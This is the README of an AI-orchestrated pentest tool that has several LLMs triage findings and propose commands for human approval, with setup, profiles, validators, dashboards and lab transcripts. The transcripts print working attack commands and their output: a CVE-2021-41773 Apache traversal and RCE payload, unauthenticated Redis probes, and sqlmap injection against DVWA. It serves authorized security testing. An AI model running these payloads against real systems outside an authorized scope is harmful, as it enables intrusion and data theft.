# HydraMind — Multi-Model AI Orchestrator for Offensive Security

HydraMind automates an authorized web pentest workflow:
recon → AI triage → vuln scan → AI reasoning → (human approval) → exploit (lab only) → AI report.
Many models (the heads), one reasoning core (the mind).

**Ethics:** runs ONLY against targets in `config/scope.yaml` — labs, owned systems, or in-scope bug bounty. Nothing else.

## Requirements
- Kali Linux, Python 3.11+, nmap, gobuster, nikto, curl, sqlmap, redis-cli,
  hydra, wpscan, commix
- Python packages: `PyYAML`, `openai`, `requests`, `langgraph`
  (see `requirements.txt`)

## Setup
```bash
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
export OPENAI_API_KEY=sk-...      # hybrid profile: triager + reasoner
export GOOGLE_API_KEY=...         # hybrid profile: validator (Gemini)
# optional providers (switch per role in config/models.yaml)
export ANTHROPIC_API_KEY=...
export OPENROUTER_API_KEY=...
# optional local models: install Ollama, then `ollama pull llama3.1:8b mistral:7b`
# export OLLAMA_BASE_URL=http://127.0.0.1:11434/v1   # default
# VirtualBox NAT — Ollama on the Windows host, no firewall changes:
# export OLLAMA_BASE_URL=http://10.0.2.2:11434/v1
```

## Run
```bash
python3 main.py --target scanme.nmap.org --skip-nikto
python3 main.py --target 127.0.0.1 --ports 1-10000 --skip-nikto
python3 main.py --target 127.0.0.1 --skip-nikto \
  --seed-url 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie 'PHPSESSID=...; security=low'
python3 main.py --target 127.0.0.1 --dry-run --skip-nikto --ports 8081   # proposals only
python3 main.py --validate-scan 6    # re-run the validator on an existing scan
python3 main.py --report 6           # Markdown + HTML from the audit trail
python3 main.py --target 127.0.0.1 --skip-nikto --profile free    # zero-cost stack
python3 main.py --target 127.0.0.1 --skip-nikto --profile quality # Claude reasoner
HYDRAMIND_N8N_WEBHOOK='https://n8n.local/webhook/hydramind' \
  python3 main.py --target 127.0.0.1 --skip-nikto   # notify n8n on events
python3 dashboard.py                                # http://127.0.0.1:8765
python3 main.py --target 127.0.0.1 --skip-nikto --routing   # context-aware models
python3 agent.py --scan 16 --routing                # LangGraph plan, executes nothing
```
Out-of-scope targets are refused by the Scope Firewall before any subprocess runs.

`--seed-url` injects a user-supplied endpoint as a top-priority triage finding
(the URL must reference the scoped target). `--cookie` is a session cookie
injected into sqlmap/curl execution only — it is never shown to the AI, never
written to reports, and never committed.

Pipeline: scope check → recon (nmap → gobuster → nikto, all saved to SQLite) →
**triager role** → **per-finding reasoner role** → **human approval gate** →
approved actions execute via `engine/runner.py` (recon, fetch, sqlmap,
redis-cli, hydra, wpscan, commix) → **cross-family validator role** →
optional **writer role** → `data/report_N.json` + `reports/report_N.md` +
`reports/report_N.html`.

### Model roles & profiles (`engine/models.py`, `config/models.yaml`)
Four roles, each with its own provider/model — switch without code changes:

| Role | Job | Calls/scan | Typical choice |
|---|---|---|---|
| triager | rank raw findings | 1 (batched) | local Ollama or GPT-4o-mini |
| reasoner | propose one action per finding | 1 per finding | GPT-4o / Claude / Gemini |
| validator | cross-family evidence check | 1 per finding | different family from reasoner |
| writer | grounded executive summary | 1 (optional) | any cheap model; `none` = deterministic |

Built-in profiles: `hybrid` (OpenAI triage+reasoning, Gemini validator),
`free` (Ollama triage, Gemini reasoning, Ollama Mistral validator),
`quality` (Ollama triage, Claude reasoner, Gemini validator),
`local` (three different local families, fully offline).

```bash
python3 main.py --profile free ...            # or HYDRAMIND_PROFILE=free
HYDRAMIND_REASONER_PROVIDER=anthropic \
HYDRAMIND_REASONER_MODEL=claude-sonnet-4-5 python3 main.py ...
```

- Providers: `openai`, `anthropic`, `google`, `openrouter`, `ollama`, `none`.
  Ollama/OpenRouter use the OpenAI-compatible adapter; set `OLLAMA_BASE_URL` if
  Ollama runs on your Windows host instead of the Kali VM.
- **Independence is computed**, not hardcoded: the validator's family is
  compared with the reasoner's (`llama`, `qwen`, `mistral`, `openai`,
  `anthropic`, `google`, ...). Same-family runs are flagged in the DB/report;
  `HYDRAMIND_REQUIRE_SECOND_FAMILY=1` refuses to validate instead.
- **Every model call is logged** in `model_calls` (role, profile, provider,
  model actually used, prompt hash, latency, tokens, response/error) — the
  reproducibility trail for the thesis.
- **Writer is opt-in**: `writer: none` keeps the deterministic report. When
  enabled, the writer only sees validated findings and must cite `[F#]` IDs;
  a failed citation check discards the summary and keeps the deterministic one.

Measured `free` profile run (Ollama on the Windows host via VirtualBox NAT
`10.0.2.2`; DVWA, 14 raw findings → 9 triaged):

| Role | Model | Calls | Latency |
|---|---|---|---|
| triager | llama3.1:8b (GPU) | 1 | 126 s |
| reasoner | Gemini free tier (fallback `gemini-3.1-flash-lite`) | 9 | avg 119 s, max 299 s |
| validator | mistral:7b (GPU) | 9 | avg 18 s |

Zero errors, all validations `same_family=0`. Expect ~20 min for a dry-run and
noisier triage than `hybrid` (generic LOW items like favicon/robots); the
validator correctly marks unexecuted dry-run findings `needs_review`.

### Scope firewall — two-stage authorization
`config/scope.yaml` supports two forms side by side:
- legacy `allowed_hosts` — recon only; exploitation-class tools always refused
- rich `targets:` entries — per-target policy:
  `host`, `authorized`, `environment: lab | live_authorized`,
  `allowed_tools`, `forbidden_tools`, `program_rules_url`, `rate_limit`

Check 1: is the host authorized at all? Check 2: is the specific tool allowed
for this target (`check_tool`)? Exploitation-class tools (sqlmap/hydra/wpscan/
commix/metasploit) require `environment: lab` regardless of `allowed_tools`.
Every allow/deny decision is logged to the `scope_events` table.

### Reasoner + approval gate
- Reasons about ONE finding at a time. Context includes sibling findings and
  the history of already-approved/executed actions for the target, so attack
  chains build step by step — each step human-approved.
- The proposed command must survive `validate_action()`: tool whitelist
  (nmap, gobuster, nikto, curl, sqlmap, redis-cli, hydra, wpscan, commix),
  fail-closed argument validation, no file I/O args, no destructive redis
  commands, hydra wordlists only from `/usr/share/wordlists/`, and it must
  reference the scoped target. One bad token rejects the action.
- `passive` proposals default to **yes**; `active`/`exploit` default to **NO**
  — you must type `y` explicitly. No input / EOF = never runs.
- On `n`: a one-line rejection reason is required and logged.
- Every decision lands in `reasoner_decisions` (FK to `triage_findings`) with
  hypothesis, proposed command, confidence, risk level, human decision,
  rejection reason, execution result.
- Approved actions execute — one human approval is the gate. Exploitation
  primitives: `curl` (fetch/traversal/RCE payloads), `sqlmap` (batch mode),
  `redis-cli` (PING/INFO/CONFIG/KEYS...), `hydra` (SSH/form credentials,
  wordlists from `/usr/share/wordlists/` only), `wpscan` (WordPress
  enumeration), `commix` (OS command injection, batch + no-shell mode).
  Exploit-class tools still require `environment: lab` per the scope policy.
- Model override: `HYDRAMIND_REASONER_MODEL=gpt-4o`

Demo transcript: see below. First full live run: DVWA lab (Docker container on
this Kali VM, `http://127.0.0.1:8081`), 2026-11-18.

### Demo run — DVWA lab (real terminal output, trimmed)

```text
[scope] '127.0.0.1' authorized.

[nmap] scanning ports + services...
       3 open port(s) found.            # 3000, 8080 (Apache 2.4.49), 8081 (DVWA / Apache 2.4.25)
[gobuster] brute-forcing http://127.0.0.1:8080...
           5 path(s) found.
[gobuster] brute-forcing http://127.0.0.1:8081...
           12 path(s) found.            # /config, /docs, /external, /php.ini, ...
[nikto] scanning http://127.0.0.1:8080 ... 0 finding(s).
[nikto] scanning http://127.0.0.1:8081 ... 0 finding(s).   # DVWA needs auth; nikto sees little

[triager] sending 20 finding(s) to GPT-4o-mini for analysis...
  [HIGH]   #1 Apache httpd 2.4.49 detected
  [MEDIUM] #2 Apache httpd 2.4.25 detected
  [MEDIUM] #3 php.ini file accessible at /php.ini
  [LOW]    #4 sensitive paths: /config, /docs, /external

--- Finding #1 [HIGH] Apache httpd version 2.4.49 detected
  hypothesis : ...CVE-2021-41773 path traversal...
  command    : nikto -h http://127.0.0.1
  expected   : confirm known vulns/misconfigs
  confidence : 70%   risk: passive
    Approve action for finding #1? [Y/n]   → running...
  → done: rc=0, 1 finding(s) @ http://127.0.0.1

--- Finding #2 [MEDIUM] Apache httpd version 2.4.25 detected
  command    : nikto -h http://127.0.0.1
    Approve action for finding #2? [Y/n]   rejection reason (one line):
      → "Duplicate of #1; port 80 closed — use :8081/:8080"

--- Finding #3 [MEDIUM] php.ini file accessible at /php.ini
  command    : nikto -h http://127.0.0.1:8080
    Approve action for finding #3? [Y/n]   rejection reason (one line):
      → "Duplicate of recon nikto on :8080; php.ini lives on :8081"

--- Finding #4 [LOW] Potential sensitive paths found: /config, /docs, /external
  command    : nikto -h http://127.0.0.1:8080 -C all
    Approve action for finding #4? [Y/n]   rejection reason (one line):
      → "Paths discovered on :8081; :8080 already nikto-scanned"

[db] full report saved → data/report_2.json
```

All four decisions are queryable in `reasoner_decisions` (finding FK, command,
confidence, decision, rejection reason, result). The full report is
`data/report_2.json`.

### Demo run — Phase 3 exploitation, local lab (real terminal output, trimmed)

```text
python3 main.py --target 127.0.0.1 --skip-nikto --ports 1-10000

[scope] '127.0.0.1' authorized.

[nmap] scanning ports + services...
       4 open port(s) found.            # 3000, 6379 (Redis), 8080 (Apache 2.4.49), 8081 (DVWA)
[gobuster] brute-forcing http://127.0.0.1:8080...   5 path(s) found.
[gobuster] brute-forcing http://127.0.0.1:8081...   12 path(s) found.

[triager] sending 21 finding(s) to GPT-4o-mini for analysis...
  [HIGH]   #1 Redis service running on port 6379
  [MEDIUM] #2 Apache httpd version 2.4.49 running on port 8080
  [MEDIUM] #3 php.ini file accessible on port 8081
  [MEDIUM] #4 index.php file redirects on port 8081

--- Finding #1 [HIGH] Redis service running on port 6379
  command    : redis-cli -h 127.0.0.1 -p 6379 INFO
    Approve action for finding #1? [y/N]   → running...
  → done: rc=0, 1 finding(s) — # Server redis_version:4.0.14 ...
     + Redis 4.0.14 INFO exposed unauthenticated

--- Finding #2 [MEDIUM] Apache httpd version 2.4.49 running on port 8080
  command    : curl -s --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    Approve action for finding #2? [y/N]   → running...
  → done: rc=0, 1 finding(s) — root:x:0:0:root:/root:/bin/bash daemon:x:1:1:...
     + Path traversal: /etc/passwd exposed

--- Finding #3 [MEDIUM] php.ini file accessible on port 8081
  command    : curl -s http://127.0.0.1:8081/php.ini
    Approve action for finding #3? [Y/n]   → running...
  → done: rc=0, 0 finding(s) — ; This file attempts to overwrite the original php.ini file...
      allow_url_fopen on   allow_url_include on

--- Finding #4 [MEDIUM] index.php file redirects on port 8081
  command    : curl -s -I http://127.0.0.1:8081/index.php
    Approve action for finding #4? [Y/n]   → running...
  → done: rc=0, 0 finding(s) — HTTP/1.1 302 Found ... Server: Apache/2.4.25 (Debian) ...

[db] full report saved → data/report_5.json
```

All four actions were approved and executed. The CVE-2021-41773 RCE variant
(`POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` with
`echo Content-Type: text/plain; echo; id`) was also verified against the same
lab container: `uid=1(daemon) gid=1(daemon)`.

### Demo run — authenticated SQLi through the gate (real, trimmed)

```text
python3 main.py --target 127.0.0.1 --skip-nikto --ports 1-10000 \
  --seed-url 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie 'PHPSESSID=<redacted>; security=low'

[seed] user endpoint queued for triage: http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit
[HIGH] #1 — Potential SQL Injection vulnerability

--- Finding #1 [HIGH] Potential SQL Injection vulnerability
  command    : sqlmap -u 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' --batch
  confidence : 90%   risk: exploit
    Approve action for finding #1? [y/N]   → running...
  → done: rc=0, 1 finding(s)
     + SQL injection confirmed: id (GET)

--- Finding #2 [MEDIUM] Redis service exposed on port 6379
  command    : redis-cli -h 127.0.0.1 -p 6379 CONFIG GET dir
  → done: rc=0, 0 finding(s) — dir /data

--- Finding #3 [MEDIUM] Apache httpd version 2.4.49 running on port 8080
  command    : curl -s --path-as-is -X POST --data 'echo Content-Type: text/plain; echo; id' \
               'http://127.0.0.1:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
  → done: rc=0, 1 finding(s) — uid=1(daemon) gid=1(daemon) groups=1(daemon)
     + Command execution confirmed (id output)
```

sqlmap found `id` (GET) injectable: boolean-based blind, error-based,
time-based blind and UNION (MySQL). The session cookie was injected by the
executor, not by the model. Full report: `data/report_6.json`.

## Phase 4 — validator, reports, PortSwigger eval

### Second-model validator (`engine/validator.py`)
After execution, an independent model re-checks every triage finding against
the logged evidence (approved command, exit code, raw output, parsed tool
findings) and returns `confirmed | likely | false_positive | needs_review`
plus an adjusted severity, confidence, rationale and remediation.

The validator role comes from the active profile (`config/models.yaml`);
override with `HYDRAMIND_VALIDATOR_PROVIDER` / `HYDRAMIND_VALIDATOR_MODEL`.
If the configured provider is unavailable, an available provider is used and
the fallback is printed; independence is recomputed against the *active*
reasoner role and flagged (`same_family=1`) when families match.
Google automatically falls back across `gemini-flash-latest` →
`gemini-3-flash-preview` → `gemini-3.1-flash-lite` when a model is unavailable
(404/429/503); API keys are redacted from stored validator errors. Unparseable
validator output becomes `needs_review`, never a silent confirmation.
`--no-validate` skips it; `--validate-scan <id>` re-validates an existing scan.

Real validator output on the authenticated-SQLi scan, true second family
(Gemini; `gemini-flash-latest` was 503 so the fallback model was used):

```text
[validator] google/gemini-flash-latest over scan 6...
  #1 [confirmed] CRITICAL (100%) Potential SQL Injection vulnerability
  #2 [confirmed] CRITICAL (100%) Redis service exposed on port 6379
  #3 [confirmed] CRITICAL (100%) Apache httpd version 2.4.49 running on port 8080
  #4 [needs_review] INFO (100%) Apache httpd version 2.4.25 running on port 8081
  #5 [false_positive] INFO (100%) Access to sensitive files (.htaccess, .htpasswd) is restricted (403)
  #6 [false_positive] INFO (100%) Redirects to /config, /docs, and /external on port 8081
```

Same scan via the OpenAI fallback (same family as the Reasoner):

```text
[validator] openai/gpt-4o over scan 6...
  #1 [confirmed] HIGH (100%) Potential SQL Injection vulnerability
  #2 [confirmed] HIGH (90%) Redis service exposed on port 6379
  #3 [confirmed] CRITICAL (100%) Apache httpd version 2.4.49 running on port 8080
  #4 [needs_review] INFO (0%) Apache httpd version 2.4.25 running on port 8081
  #5 [false_positive] INFO (100%) Access to sensitive files (.htaccess, .htpasswd) is restricted (403)
  #6 [false_positive] INFO (90%) Redirects to /config, /docs, and /external on port 8081
```

### Report writer (`engine/reporter.py`)
`python3 main.py --report <scan_id>` renders `reports/report_<id>.md` and a
self-contained dark-theme `reports/report_<id>.html` **purely from SQLite**:
executive summary, severity/verdict breakdown, per-finding evidence + human
decision, validator verdict/remediation, decision log, raw tool findings and
scope events. Reports are generated automatically after each scan
(`--no-report` to skip); `reports/` is gitignored.

### PortSwigger eval harness (`eval/run_eval.py`)
Scores recon → triage → reasoning quality against Web Security Academy labs in
`--dry-run` mode (nothing executes; exploitation still needs the human gate):

1. `cp eval/labs.example.yaml eval/labs.yaml` (gitignored) and fill in lab
   host + seed URL from https://portswigger.net/web-security/all-labs
2. add each lab host to `config/scope.yaml` with `environment: lab` and
   `allowed_tools`
3. export your provider keys (the harness passes the environment through to
   `main.py`), then `python eval/run_eval.py` (optionally `--only sqli`,
   `--limit 3`, `--profile free`)

Each lab scores 1.0 (expected tool + keyword), 0.5 (expected tool only) or 0.0.
Artifacts: `eval/artifacts/<lab>.json|.log`, summary in
`eval/results/eval_<timestamp>.json`. Labs missing from scope are reported as
`scope_missing` and never scanned.

Real run against a live Academy lab ("SQL injection UNION attack, finding a
column containing text", `--ports 443`):

```text
[eval] SQL injection UNION attack finding a column containing text (sqli)
       score 1.0 · tools ['sqlmap'] · keywords ['injection', 'category'] · proposals 1

--- Finding #1 [MEDIUM] Potentially vulnerable endpoint found: https://<lab-id>.web-security-academy.net/filter?category=Gifts
  command    : sqlmap -u 'https://<lab-id>.web-security-academy.net/filter?category=Gifts' --batch
  [dry-run] proposal recorded — not executed
```

Tests: `python tests/test_phase4.py` (validator parsing/provider selection,
model registry/families/independence, writer citations, report rendering +
HTML escaping, DB round-trips, model-call logging, eval scoring).

## Phase 5 — n8n alerts + local dashboard

### n8n notifications (`engine/notifier.py`)
Import `integrations/n8n/hydramind_notify.json` into n8n, activate the
workflow, and point HydraMind at its production URL:

```bash
export HYDRAMIND_N8N_WEBHOOK='https://<n8n>/webhook/hydramind'
python3 main.py --target 127.0.0.1 --skip-nikto
python3 main.py ... --webhook 'https://<n8n>/webhook/hydramind'  # per-run
python3 main.py ... --no-notify                                  # disable
```

| Event | When | Payload highlights |
|---|---|---|
| `scan_started` | scope allowed, scan row created | `scan_id`, `target`, `profile`, `dry_run` |
| `scan_refused` | scope firewall denied target | `target`, `reason` |
| `scan_failed` | triage/reasoner AI call or seed URL failed | `scan_id`, `stage`, `error` |
| `scan_finished` | pipeline end | counts + verdicts + report paths |
| `validation_finished` | `--validate-scan` done | counts + verdicts + report paths |
| `agent_plan` | `agent.py` finished a review | `scan_id`, counts, plan path |

Payload envelope: `{"source":"hydramind","event":"...","timestamp":"...",
"data":{...}}`; `scan_finished` also includes `raw_findings`,
`triage_findings`, `executed_actions`, `validations`, `verdicts`,
`dry_run` and `reports`. The webhook is best-effort (5 s timeout): failures
log one line and never abort a scan. Before sending, keys named `key`,
`token`, `secret`, `cookie`, `password` or `authorization` are replaced with
`[redacted]` and strings pass through `models.redact` — cookies and API keys
never leave the machine. In n8n, replace the NoOp node with Slack/Telegram/
Email/Discord and use `{{ $json.message }}`.

### Dashboard (`dashboard.py`, `engine/dashboard.py`)
```bash
python3 dashboard.py                 # 127.0.0.1:8765
python3 dashboard.py --port 9000 --db data/pipeline.db
```
Read-only view over the audit trail: totals, scans (profile, raw/triage/
executed counts, confirmed/FP, report links), per-scan validations,
decisions and writer summary, recent model calls and scope events. It
auto-refreshes every 10 s. Endpoints: `/`, `/api/health`, `/api/overview`,
`/api/scan/<id>`, `/reports/report_<id>.md|html`.

Security: binds localhost only by default (non-loopback bind prints a
warning — there is no authentication), never writes to SQLite, and only
serves files matching `report_<id>.md|html` from `reports/` (traversal and
arbitrary names are rejected). WAL mode + a 5 s busy timeout let it read
while a scan is writing.

Tests: `python tests/test_phase5.py` (43 checks — event redaction, webhook
delivery/failure, dashboard counts/detail, report path guard, HTTP API,
n8n workflow JSON).

## Phase 6 — RAG, routing policies, LangGraph review agent

### CVE/ExploitDB RAG (`engine/rag.py`, `knowledge/cve_exploits.jsonl`)
The triager and reasoner receive the top-ranked references for each finding
from a tracked, curated corpus (27 entries: Apache 2.4.49/2.4.50, Log4Shell,
ProxyShell, Redis unauth, DVWA, Jenkins, Docker API, ...). Ranking is offline
BM25 with exact boosts for CVE IDs, products and affected versions; prompts
require citations as `[R1]`, `[R2]` and forbid invented CVEs.

```bash
export HYDRAMIND_RAG=0                   # disable retrieval
export HYDRAMIND_RAG_EXTRA=/path/extra.jsonl:/path/more.jsonl  # extra corpora
export HYDRAMIND_RAG_SEARCHSPLOIT=1      # also query local searchsploit
export HYDRAMIND_AGENT_RAG_DEEP=4.0      # agent deep-review score threshold
```
Extra JSONL entries use the same schema as the tracked corpus. `searchsploit`
runs as an argv list with an 8 s timeout, only when explicitly enabled; its
results are labelled `EDB-*` and never executed.

### Routing policies (`engine/routing.py`, `config/routing.yaml`)
Opt-in, context-aware model selection per role (profile remains the default):

```bash
python3 main.py --target 127.0.0.1 --skip-nikto --routing
export HYDRAMIND_ROUTING=1
export HYDRAMIND_ROUTING_FILE=/path/routing.yaml
```

Rules match on severity, source, risk level, minimum finding count or minimum
RAG score and select a symbolic tier (`deep`/`cheap` from the active profile,
now defined in `config/models.yaml`) or an explicit provider/model. The
validator is deliberately never routed — its cross-family independence is
computed against the reasoner — and any rule that would move the reasoner into
the validator's family is skipped with a warning. Shipped rules: high/critical
or strong RAG hit → `deep`; low/info → `cheap`; ≥40 triage findings → cheap
triage.

### LangGraph review agent (`agent.py`, `engine/agent.py`)
```bash
python3 agent.py --scan 16                          # RAG + high-severity review
python3 agent.py --scan 16 --routing --max-deep 3
python3 agent.py --scan 16 --no-rag --json /tmp/plan.json
```
The graph is `load → route → (deep_review | assemble) → assemble → END`.
`route` retrieves references and applies routing per finding; `deep_review`
asks the reasoner for ONE next command, grounded with `[R#]` citations;
`assemble` writes `data/agent_scan_<id>.json` (or `--json`) and prints a plan.

**Safety:** the agent is review-only. It never executes a command, never
changes findings/decisions/validations (model calls are still audited), caps
deep reviews (default 4), and runs every proposal through the same
`validate_action` fail-closed boundary. Output entries carry
`command_safe: true|false`; execution still requires `main.py` and the single
human approval gate. If a webhook is configured the `agent_plan` event is sent.

Tests: `python tests/test_phase6.py` (38 checks — corpus/ranking/cutoff,
extra corpora, routing tiers/overrides/disable, prompt citation injection,
LangGraph fan-out, safety rejection, deep cap, DB immutability).

## Lab targets (local, scope-listed, `environment: lab`)

| Target | Service | Status |
|---|---|---|
| `127.0.0.1:3000` | OWASP Juice Shop | container down — restart needed |
| `127.0.0.1:6379` | Redis 4.0.14 | unauthenticated (INFO verified) |
| `127.0.0.1:8080` | Apache httpd 2.4.49 | CVE-2021-41773 traversal + RCE verified |
| `127.0.0.1:8081` | DVWA v1.10 | admin/password, security low |
| `127.0.0.1:9099` | command-injection harness (temp) | used once to verify commix live |

Planned infrastructure: public-IP lab host (GitHub Student benefits) and
Metasploit setup, so tests can run beyond localhost.

## Roadmap
- Phase 0 (done): scope firewall + nmap engine + SQLite store
- Phase 1 (done): gobuster + nikto + AI triage
- Phase 2 (done): per-finding AI reasoner + human approval gate + two-stage scope policy
- Phase 3 (done): executable exploitation behind the single human gate —
  curl (fetch/traversal/RCE), sqlmap (batch + authenticated sessions via
  `--cookie`), redis-cli (unauth Redis), hydra, wpscan, commix; CVE-2021-41773,
  RCE and SQLi verified live on the local lab, commix verified live against a
  local command-injection harness (DVWA's ping endpoint is too slow for
  commix's time-based phase). hydra/wpscan are parser- and validation-tested,
  awaiting SSH/WordPress lab targets for a live run.
- Phase 3 (remaining): Juice Shop retest when the container is back
- Phase 4 (done): second-model validator (Anthropic/Google/OpenAI fallback,
  same-family flagged), Markdown + HTML report writer from SQLite,
  `--dry-run`, `--validate-scan`, and the PortSwigger eval harness
  (dry-run scoring; live lab runs need Academy lab URLs + scope entries)
- Phase 4.1 (done): role-based model registry + profiles (`hybrid/free/
  quality/local`), Ollama/OpenRouter adapters, computed cross-family
  independence, per-call logging (`model_calls`), opt-in grounded writer
- Phase 5 (done): n8n trigger/notify (scan events, redacted payloads,
  best-effort delivery) + read-only localhost dashboard over SQLite
- Phase 6 (done): offline CVE/ExploitDB RAG with [R#] grounding, opt-in
  context-aware routing tiers, LangGraph review agent (plan-only,
  safety-checked, never executes)
